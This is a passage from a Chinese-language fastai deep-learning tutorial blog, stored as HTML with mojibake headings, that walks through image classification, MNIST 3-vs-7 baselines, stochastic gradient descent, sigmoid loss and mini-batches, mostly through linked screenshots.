href="#åˆ é™¤ä¸‹è½½å¤±è´¥çš„å›¾ç‰‡" class="headerlink" title="åˆ é™¤ä¸‹è½½å¤±è´¥çš„å›¾ç‰‡"></a>åˆ é™¤ä¸‹è½½å¤±è´¥çš„å›¾ç‰‡</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/4.png"></p><h3 id="åˆ›å»ºä¸€ä¸ªDataloaderæ¨¡æ¿-DataBlock"><a href="#åˆ›å»ºä¸€ä¸ªDataloaderæ¨¡æ¿-DataBlock" class="headerlink" title="åˆ›å»ºä¸€ä¸ªDataloaderæ¨¡æ¿-DataBlock"></a>åˆ›å»ºä¸€ä¸ªDataloaderæ¨¡æ¿-DataBlock</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/5.png"></p><h2 id="è®­ç»ƒ"><a href="#è®­ç»ƒ" class="headerlink" title="è®­ç»ƒ"></a>è®­ç»ƒ</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/6.png"></p><h2 id="åˆ›å»ºæ··æ·†çŸ©é˜µ"><a href="#åˆ›å»ºæ··æ·†çŸ©é˜µ" class="headerlink" title="åˆ›å»ºæ··æ·†çŸ©é˜µ"></a>åˆ›å»ºæ··æ·†çŸ©é˜µ</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/7.png"></p><h2 id="æŸ¥çœ‹é¢„æµ‹é”™è¯¯çš„å’Œç½®ä¿¡åº¦æœ€ä½çš„5ä¸ªå›¾"><a href="#æŸ¥çœ‹é¢„æµ‹é”™è¯¯çš„å’Œç½®ä¿¡åº¦æœ€ä½çš„5ä¸ªå›¾" class="headerlink" title="æŸ¥çœ‹é¢„æµ‹é”™è¯¯çš„å’Œç½®ä¿¡åº¦æœ€ä½çš„5ä¸ªå›¾"></a>æŸ¥çœ‹é¢„æµ‹é”™è¯¯çš„å’Œç½®ä¿¡åº¦æœ€ä½çš„5ä¸ªå›¾</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/8.png"></p><h2 id="æ•°æ®æ¸…æ´—"><a href="#æ•°æ®æ¸…æ´—" class="headerlink" title="æ•°æ®æ¸…æ´—"></a>æ•°æ®æ¸…æ´—</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/9.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä¹‹åå†é‡æ–°è®­ç»ƒ</span></span><br></pre></td></tr></table></figure><h2 id="åŠ è½½è®­ç»ƒå¥½çš„æ¨¡å‹"><a href="#åŠ è½½è®­ç»ƒå¥½çš„æ¨¡å‹" class="headerlink" title="åŠ è½½è®­ç»ƒå¥½çš„æ¨¡å‹"></a>åŠ è½½è®­ç»ƒå¥½çš„æ¨¡å‹</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/10.png"></p><h2 id="æŸ¥çœ‹è¾“å‡ºtensorçš„æ˜ å°„å…³ç³»"><a href="#æŸ¥çœ‹è¾“å‡ºtensorçš„æ˜ å°„å…³ç³»" class="headerlink" title="æŸ¥çœ‹è¾“å‡ºtensorçš„æ˜ å°„å…³ç³»"></a>æŸ¥çœ‹è¾“å‡ºtensorçš„æ˜ å°„å…³ç³»</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/11.png"></p><h2 id="ä½¿ç”¨notebookåˆ›å»ºåº”ç”¨"><a href="#ä½¿ç”¨notebookåˆ›å»ºåº”ç”¨" class="headerlink" title="ä½¿ç”¨notebookåˆ›å»ºåº”ç”¨"></a>ä½¿ç”¨notebookåˆ›å»ºåº”ç”¨</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/12.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/13.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/14.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/15.png"></p><h3 id="Turning-your-notebook-into-a-real-app"><a href="#Turning-your-notebook-into-a-real-app" class="headerlink" title="Turning your notebook into a real app"></a>Turning your notebook into a real app</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/16.png"><br>æŠŠéœ€è¦çš„ä»£ç æ‹·è´åˆ°æ–°çš„notebookæ–‡ä»¶é‡Œ<br>æŠŠç½‘å€é‡Œçš„notebooksæ¢æˆvolla<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/17.png"><br>å†ä½¿ç”¨binderå³å¯å‘å¸ƒ<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/18.png"></p><h1 id="å†æ¥çœ‹ä¸ªæ›´å…·ä½“çš„ä¾‹å­â€”â€”æ‰‹å†™æ•°å­—è¯†åˆ«"><a href="#å†æ¥çœ‹ä¸ªæ›´å…·ä½“çš„ä¾‹å­â€”â€”æ‰‹å†™æ•°å­—è¯†åˆ«" class="headerlink" title="å†æ¥çœ‹ä¸ªæ›´å…·ä½“çš„ä¾‹å­â€”â€”æ‰‹å†™æ•°å­—è¯†åˆ«"></a>å†æ¥çœ‹ä¸ªæ›´å…·ä½“çš„ä¾‹å­â€”â€”æ‰‹å†™æ•°å­—è¯†åˆ«</h1><h2 id="é¦–å…ˆè·å–path"><a href="#é¦–å…ˆè·å–path" class="headerlink" title="é¦–å…ˆè·å–path"></a>é¦–å…ˆè·å–path</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/19.png"></p><h2 id="ä¸ºäº†æ–¹ä¾¿æ˜¾ç¤ºï¼Œéšè—çˆ¶æ–‡ä»¶å¤¹"><a href="#ä¸ºäº†æ–¹ä¾¿æ˜¾ç¤ºï¼Œéšè—çˆ¶æ–‡ä»¶å¤¹" class="headerlink" title="ä¸ºäº†æ–¹ä¾¿æ˜¾ç¤ºï¼Œéšè—çˆ¶æ–‡ä»¶å¤¹"></a>ä¸ºäº†æ–¹ä¾¿æ˜¾ç¤ºï¼Œéšè—çˆ¶æ–‡ä»¶å¤¹</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/20.png"></p><h2 id="æŸ¥çœ‹è·¯å¾„ä¸‹æ–‡ä»¶"><a href="#æŸ¥çœ‹è·¯å¾„ä¸‹æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹è·¯å¾„ä¸‹æ–‡ä»¶"></a>æŸ¥çœ‹è·¯å¾„ä¸‹æ–‡ä»¶</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/21.png"></p><h2 id="è·å–å¸®åŠ©"><a href="#è·å–å¸®åŠ©" class="headerlink" title="è·å–å¸®åŠ©"></a>è·å–å¸®åŠ©</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/22.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/23.png"><br>æ‰“ä¸¤ä¸ªï¼Ÿå¯ä»¥è·å¾—source code<br>è¿˜å¯ä»¥docï¼ˆpath.ls)æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£</p><h2 id="ç»§ç»­æŸ¥çœ‹"><a href="#ç»§ç»­æŸ¥çœ‹" class="headerlink" title="ç»§ç»­æŸ¥çœ‹"></a>ç»§ç»­æŸ¥çœ‹</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/24.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/25.png"></p><h2 id="è½¬æ¢æˆnumpyæ•°ç»„å’Œpytorchæ•°ç»„"><a href="#è½¬æ¢æˆnumpyæ•°ç»„å’Œpytorchæ•°ç»„" class="headerlink" title="è½¬æ¢æˆnumpyæ•°ç»„å’Œpytorchæ•°ç»„"></a>è½¬æ¢æˆnumpyæ•°ç»„å’Œpytorchæ•°ç»„</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/26.png"><br>è¿™ä¸¤ä¸ªçš„åŒºåˆ«å°±åœ¨äºtensorå¯ä»¥ç”¨GPUå¹¶è¡Œè®¡ç®—</p><h2 id="è½¬æ¢æˆpdæŸ¥çœ‹èƒŒæ™¯æ¢¯åº¦"><a href="#è½¬æ¢æˆpdæŸ¥çœ‹èƒŒæ™¯æ¢¯åº¦" class="headerlink" title="è½¬æ¢æˆpdæŸ¥çœ‹èƒŒæ™¯æ¢¯åº¦"></a>è½¬æ¢æˆpdæŸ¥çœ‹èƒŒæ™¯æ¢¯åº¦</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/27.png"></p><h2 id="Baseline-ç”¨æ¯å¼ 3å’Œ7çš„å‡å€¼å’Œéœ€è¦é¢„æµ‹çš„å›¾ä½œæ¯”è¾ƒï¼Œçœ‹å“ªä¸ªæ›´æ¥è¿‘"><a href="#Baseline-ç”¨æ¯å¼ 3å’Œ7çš„å‡å€¼å’Œéœ€è¦é¢„æµ‹çš„å›¾ä½œæ¯”è¾ƒï¼Œçœ‹å“ªä¸ªæ›´æ¥è¿‘" class="headerlink" title="Baseline-ç”¨æ¯å¼ 3å’Œ7çš„å‡å€¼å’Œéœ€è¦é¢„æµ‹çš„å›¾ä½œæ¯”è¾ƒï¼Œçœ‹å“ªä¸ªæ›´æ¥è¿‘"></a>Baseline-ç”¨æ¯å¼ 3å’Œ7çš„å‡å€¼å’Œéœ€è¦é¢„æµ‹çš„å›¾ä½œæ¯”è¾ƒï¼Œçœ‹å“ªä¸ªæ›´æ¥è¿‘</h2><h3 id="å›¾è½¬æ¢æˆtensor"><a href="#å›¾è½¬æ¢æˆtensor" class="headerlink" title="å›¾è½¬æ¢æˆtensor"></a>å›¾è½¬æ¢æˆtensor</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/28.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/29.png"></p><h3 id="æŠŠåˆ—è¡¨é‡Œçš„å…ƒç´ å †å èµ·æ¥"><a href="#æŠŠåˆ—è¡¨é‡Œçš„å…ƒç´ å †å èµ·æ¥" class="headerlink" title="æŠŠåˆ—è¡¨é‡Œçš„å…ƒç´ å †å èµ·æ¥"></a>æŠŠåˆ—è¡¨é‡Œçš„å…ƒç´ å †å èµ·æ¥</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/30.png"><br>è¿™é‡Œè¦/255åšæ ‡å‡†åŒ–</p><h3 id="æŸ¥çœ‹ç»´åº¦"><a href="#æŸ¥çœ‹ç»´åº¦" class="headerlink" title="æŸ¥çœ‹ç»´åº¦"></a>æŸ¥çœ‹ç»´åº¦</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/31.png"><br>shapeå°±æ˜¯ä¸€ä¸ªåŒ…å«å¼ é‡åœ¨æ¯ä¸ªåæ ‡æ–¹å‘ä¸Šå°ºå¯¸çš„åˆ—è¡¨<br>é˜¶å°±æ˜¯å¼ é‡å¿ åæ ‡è½´æˆ–è€…ç»´åº¦çš„æ•°é‡</p><h3 id="æ²¿ç€ä¸€ä¸ªç»´åº¦å–å‡å€¼"><a href="#æ²¿ç€ä¸€ä¸ªç»´åº¦å–å‡å€¼" class="headerlink" title="æ²¿ç€ä¸€ä¸ªç»´åº¦å–å‡å€¼"></a>æ²¿ç€ä¸€ä¸ªç»´åº¦å–å‡å€¼</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/32.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/33.png"></p><h3 id="ç”¨L1æˆ–L2èŒƒæ•°æ±‚å·®å¼‚"><a href="#ç”¨L1æˆ–L2èŒƒæ•°æ±‚å·®å¼‚" class="headerlink" title="ç”¨L1æˆ–L2èŒƒæ•°æ±‚å·®å¼‚"></a>ç”¨L1æˆ–L2èŒƒæ•°æ±‚å·®å¼‚</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/34.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/35.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/36.png"><br>æˆ–è€…æ˜¯<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/37.png"></p><h3 id="æŸ¥çœ‹pytorchä¸­tensorçš„type"><a href="#æŸ¥çœ‹pytorchä¸­tensorçš„type" class="headerlink" title="æŸ¥çœ‹pytorchä¸­tensorçš„type"></a>æŸ¥çœ‹pytorchä¸­tensorçš„type</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/38.png"></p><h3 id="æµ‹è¯•æ•ˆæœ"><a href="#æµ‹è¯•æ•ˆæœ" class="headerlink" title="æµ‹è¯•æ•ˆæœ"></a>æµ‹è¯•æ•ˆæœ</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/39.png"></p><h4 id="å®šä¹‰æŸå¤±å‡½æ•°"><a href="#å®šä¹‰æŸå¤±å‡½æ•°" class="headerlink" title="å®šä¹‰æŸå¤±å‡½æ•°"></a>å®šä¹‰æŸå¤±å‡½æ•°</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/40.png"></p><h4 id="å¯¹éªŒè¯é›†ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ±‚L1èŒƒæ•°ï¼ˆå¹¿æ’­æœºåˆ¶ï¼‰"><a href="#å¯¹éªŒè¯é›†ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ±‚L1èŒƒæ•°ï¼ˆå¹¿æ’­æœºåˆ¶ï¼‰" class="headerlink" title="å¯¹éªŒè¯é›†ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ±‚L1èŒƒæ•°ï¼ˆå¹¿æ’­æœºåˆ¶ï¼‰"></a>å¯¹éªŒè¯é›†ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ±‚L1èŒƒæ•°ï¼ˆå¹¿æ’­æœºåˆ¶ï¼‰</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/41.png"></p><h4 id="åˆ¤æ–­"><a href="#åˆ¤æ–­" class="headerlink" title="åˆ¤æ–­"></a>åˆ¤æ–­</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/42.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/43.png"></p><h4 id="å‡†ç¡®ç‡"><a href="#å‡†ç¡®ç‡" class="headerlink" title="å‡†ç¡®ç‡"></a>å‡†ç¡®ç‡</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/44.png"></p><h2 id="SGD"><a href="#SGD" class="headerlink" title="SGD"></a>SGD</h2><h3 id="è®¡ç®—æ¢¯åº¦"><a href="#è®¡ç®—æ¢¯åº¦" class="headerlink" title="è®¡ç®—æ¢¯åº¦"></a>è®¡ç®—æ¢¯åº¦</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/45.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/46.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/47.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/48.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/49.png"></p><h3 id="ä½¿ç”¨å­¦ä¹ ç‡"><a href="#ä½¿ç”¨å­¦ä¹ ç‡" class="headerlink" title="ä½¿ç”¨å­¦ä¹ ç‡"></a>ä½¿ç”¨å­¦ä¹ ç‡</h3><p>The learning rate is often a number between 0.001 and 0.1, although it could be anything.<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/50.png"></p><h3 id="An-End-to-End-SGD-Example"><a href="#An-End-to-End-SGD-Example" class="headerlink" title="An End-to-End SGD Example"></a>An End-to-End SGD Example</h3><h4 id="ç”Ÿæˆæ•°æ®"><a href="#ç”Ÿæˆæ•°æ®" class="headerlink" title="ç”Ÿæˆæ•°æ®"></a>ç”Ÿæˆæ•°æ®</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/51.png"></p><h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/52.png"></p><h4 id="æŸå¤±å‡½æ•°"><a href="#æŸå¤±å‡½æ•°" class="headerlink" title="æŸå¤±å‡½æ•°"></a>æŸå¤±å‡½æ•°</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/53.png"></p><h4 id="Initialize-the-parameters"><a href="#Initialize-the-parameters" class="headerlink" title="Initialize the parameters"></a>Initialize the parameters</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/54.png"></p><h4 id="Calculate-the-predictions"><a href="#Calculate-the-predictions" class="headerlink" title="Calculate the predictions"></a>Calculate the predictions</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/55.png"></p><h4 id="Calculate-the-loss"><a href="#Calculate-the-loss" class="headerlink" title="Calculate the loss"></a>Calculate the loss</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/56.png"></p><h4 id="Calculate-the-gradients"><a href="#Calculate-the-gradients" class="headerlink" title="Calculate the gradients"></a>Calculate the gradients</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/57.png"></h4><h4 id="Step-the-weights"><a href="#Step-the-weights" class="headerlink" title="Step the weights."></a>Step the weights.</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/58.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/59.png"></p><h4 id="Repeat-the-process"><a href="#Repeat-the-process" class="headerlink" title="Repeat the process"></a>Repeat the process</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/60.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/61.png"></p><h4 id="stop"><a href="#stop" class="headerlink" title="stop"></a>stop</h4><p>We just decided to stop after 10 epochs arbitrarily. In practice, we would watch the training and validation losses and our metrics to decide when to stop, as weâ€™ve discussed.</p><h2 id="The-MNIST-Loss-Function"><a href="#The-MNIST-Loss-Function" class="headerlink" title="The MNIST Loss Function"></a>The MNIST Loss Function</h2><h3 id="æŸ¥çœ‹å‡†ç¡®ç‡çš„æ¢¯åº¦"><a href="#æŸ¥çœ‹å‡†ç¡®ç‡çš„æ¢¯åº¦" class="headerlink" title="æŸ¥çœ‹å‡†ç¡®ç‡çš„æ¢¯åº¦"></a>æŸ¥çœ‹å‡†ç¡®ç‡çš„æ¢¯åº¦</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/62.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/63.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/64.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">view(-<span class="number">1</span>,<span class="number">28</span>*<span class="number">28</span>)</span><br><span class="line">-<span class="number">1</span>è¡¨ç¤ºè‡ªåŠ¨é€‚åº”</span><br><span class="line"></span><br><span class="line">unsqueeze(<span class="number">1</span>)</span><br><span class="line">è¡¨ç¤ºåœ¨ç¬¬äºŒä¸ªç»´åº¦ä¸Šæ‰©å±•ä¸€ç»´</span><br></pre></td></tr></table></figure><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/65.png"><br>æ³¨æ„è¿™é‡Œå®é™…ä¸Šæ˜¯<br>definit_params(size, std=1.0):return(torch.randn(size)*std).requires_grad_()ï¼Œä¹Ÿå°±æ˜¯è¦ä¿ç•™æƒé‡çš„æ¢¯åº¦<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/66.png"></p><h3 id="çŸ©é˜µä¹˜æ³•"><a href="#çŸ©é˜µä¹˜æ³•" class="headerlink" title="çŸ©é˜µä¹˜æ³•"></a>çŸ©é˜µä¹˜æ³•</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/67.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/68.png"></p><h3 id="item-è§£å¼€å¼ é‡"><a href="#item-è§£å¼€å¼ é‡" class="headerlink" title="item()è§£å¼€å¼ é‡"></a>item()è§£å¼€å¼ é‡</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/69.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/70.png"><br>xå˜åŒ–åï¼Œoutputæ— å˜åŒ–ï¼Œæ¢¯åº¦ä¸º0<br>æ‰€ä»¥ç”¨å‡†ç¡®ç‡å‡½æ•°å½“æŸå¤±å‡½æ•°ä¸ç¨³å®šï¼Œå¾ˆå¤šåœ°æ–¹æ¢¯åº¦éƒ½æ˜¯0</p><h3 id="å¦ä¸€ç§æŸå¤±å‡½æ•°"><a href="#å¦ä¸€ç§æŸå¤±å‡½æ•°" class="headerlink" title="å¦ä¸€ç§æŸå¤±å‡½æ•°"></a>å¦ä¸€ç§æŸå¤±å‡½æ•°</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/71.png"><br>ç›®æ ‡æ˜¯1çš„è¯ï¼Œé‚£æŸå¤±å°±æ˜¯1-predictionsï¼Œå¦‚æœç›®æ ‡æ˜¯0çš„è¯ï¼Œé‚£æŸå¤±å°±æ˜¯predictions<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/72.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/73.png"><br>ä¸Šè¿°æŸå¤±å‡½æ•°åªæ¥å—0-1èŒƒå›´çš„è¾“å…¥ï¼Œå¦‚ä½•è§£å†³ï¼Ÿ</p><h3 id="sigmoid"><a href="#sigmoid" class="headerlink" title="sigmoid"></a>sigmoid</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/74.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/75.png"></p><h3 id="ç»¼ä¸Š"><a href="#ç»¼ä¸Š" class="headerlink" title="ç»¼ä¸Š"></a>ç»¼ä¸Š</h3><p>æˆ‘ä»¬çœŸæ­£å…³å¿ƒçš„è®¡æ—¶å‡†ç¡®ç‡ï¼Œä½†æ˜¯ç”¨å‡†ç¡®ç‡å¾€å¾€æ‹¿ä¸åˆ°æ¢¯åº¦ï¼Œæ‰€ä»¥å¼•å‡ºäº†ä¸€ä¸ªæœ‰è¾ƒå¥½æ¢¯åº¦çš„æŸå¤±å‡½æ•°ï¼ˆå‡†ç¡®ç‡æœ‰æ—¶å€™ä¹Ÿå¯ä»¥å½“æŸå¤±å‡½æ•°ï¼‰</p><h3 id="mini-batch"><a href="#mini-batch" class="headerlink" title="mini-batch"></a>mini-batch</h3><p>å«ä¹‰å…¶å®å°±æ˜¯è‹¥å¹²æ¡æ•°æ®ï¼Œä»–çš„å¤§å°å«åšbatchsize<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/76.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/77.png"><br>æœ€åä¸€ä¸ªbatchçš„sizeå¯èƒ½ä¼šå°äºè®¾å®šæ•°</p><h2 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/78.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/79.png"><br>å…¶ä¸­firstæ˜¯fastaiå‡½æ•°ï¼Œå–å‡ºè¿­ä»£å™¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ <br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/80.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/81.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/82.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/83.png"><br>æ¢¯åº¦ä¼šè¢«ç´¯åŠ ï¼Œæ‰€ä»¥è¦æ¸…é›¶ã€‚</p><h5 id="è®°ä½ä¸‹åˆ’çº¿æ„å‘³ç€å‡½æ•°ç›´æ¥å¯¹åŸå§‹å¯¹è±¡è¿›è¡Œä¿®æ”¹"><a href="#è®°ä½ä¸‹åˆ’çº¿æ„å‘³ç€å‡½æ•°ç›´æ¥å¯¹åŸå§‹å¯¹è±¡è¿›è¡Œä¿®æ”¹" class="headerlink" title="è®°ä½ä¸‹åˆ’çº¿æ„å‘³ç€å‡½æ•°ç›´æ¥å¯¹åŸå§‹å¯¹è±¡è¿›è¡Œä¿®æ”¹"></a>è®°ä½ä¸‹åˆ’çº¿æ„å‘³ç€å‡½æ•°ç›´æ¥å¯¹åŸå§‹å¯¹è±¡è¿›è¡Œä¿®æ”¹</h5><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/84.png"></p><h3 id="SGDéšæœºæ¢¯åº¦ä¸‹é™çš„å¾ªç¯"><a href="#SGDéšæœºæ¢¯åº¦ä¸‹é™çš„å¾ªç¯" class="headerlink" title="SGDéšæœºæ¢¯åº¦ä¸‹é™çš„å¾ªç¯"></a>SGDéšæœºæ¢¯åº¦ä¸‹é™çš„å¾ªç¯</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/85.png"><br>å› ä¸ºè¿™ä¸€æ­¥æ—¶ä¸éœ€è¦è®¡ç®—æ¢¯åº¦ï¼Œæ‰€ä»¥è¦ç”¨p.dataè€Œä¸æ˜¯p<br>xbçš„shapeæ˜¯256<em>28</em>28</p><h3 id="æ¢¯åº¦ä¸‹é™å’Œéšæœºæ¢¯åº¦ä¸‹é™çš„åŒºåˆ«"><a href="#æ¢¯åº¦ä¸‹é™å’Œéšæœºæ¢¯åº¦ä¸‹é™çš„åŒºåˆ«" class="headerlink" title="æ¢¯åº¦ä¸‹é™å’Œéšæœºæ¢¯åº¦ä¸‹é™çš„åŒºåˆ«"></a>æ¢¯åº¦ä¸‹é™å’Œéšæœºæ¢¯åº¦ä¸‹é™çš„åŒºåˆ«</h3><p>éšæœºæ¢¯åº¦ä¸‹é™æœ‰mini-batchï¼Œå³è´¯ç©¿æ¯ä¸ªå°æ‰¹æ¬¡çš„å¾ªç¯<br>å¯¹äºæ¢¯åº¦ä¸‹é™ï¼Œå®ƒæ¯æ¬¡éƒ½æ˜¯é’ˆå¯¹æ•´ä¸ªæ•°æ®é›†çš„(æ²¡æœ‰forå¾ªç¯ï¼Œä¸€æ¬¡æ€§ç”¨æ•°æ®é›†æ‰€æœ‰æ•°æ®ç®—æ¢¯åº¦)</p><h3 id="å‡†ç¡®ç‡-1"><a href="#å‡†ç¡®ç‡-1" class="headerlink" title="å‡†ç¡®ç‡"></a>å‡†ç¡®ç‡</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/86.png"><br>sigmoidçš„å€¼åŸŸæ˜¯ï¼ˆ0ï¼Œ1ï¼‰ï¼Œæ‰€ä»¥ç”¨0.5åˆ†ç•Œ</p><h3 id="éªŒè¯é›†å‡†ç¡®ç‡"><a href="#éªŒè¯é›†å‡†ç¡®ç‡" class="headerlink" title="éªŒè¯é›†å‡†ç¡®ç‡"></a>éªŒè¯é›†å‡†ç¡®ç‡</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/87.png"><br>roundç”¨äºä¿ç•™4ä½å°æ•°</p><h3 id="ä¸€ä¸ªepoch"><a href="#ä¸€ä¸ªepoch" class="headerlink" title="ä¸€ä¸ªepoch"></a>ä¸€ä¸ªepoch</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/88.png"></p><h3 id="äºŒåä¸ªepoch"><a href="#äºŒåä¸ªepoch" class="headerlink" title="äºŒåä¸ªepoch"></a>äºŒåä¸ªepoch</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/89.png"></p><h2 id="åšä¸€äº›ç®€åŒ–â€”â€”åˆ›å»ºä¼˜åŒ–å™¨"><a href="#åšä¸€äº›ç®€åŒ–â€”â€”åˆ›å»ºä¼˜åŒ–å™¨" class="headerlink" title="åšä¸€äº›ç®€åŒ–â€”â€”åˆ›å»ºä¼˜åŒ–å™¨"></a>åšä¸€äº›ç®€åŒ–â€”â€”åˆ›å»ºä¼˜åŒ–å™¨</h2><p>é¦–å…ˆè¦åšçš„å°±æ˜¯æ”¾å¼ƒlinearï¼ˆï¼‰<br><img 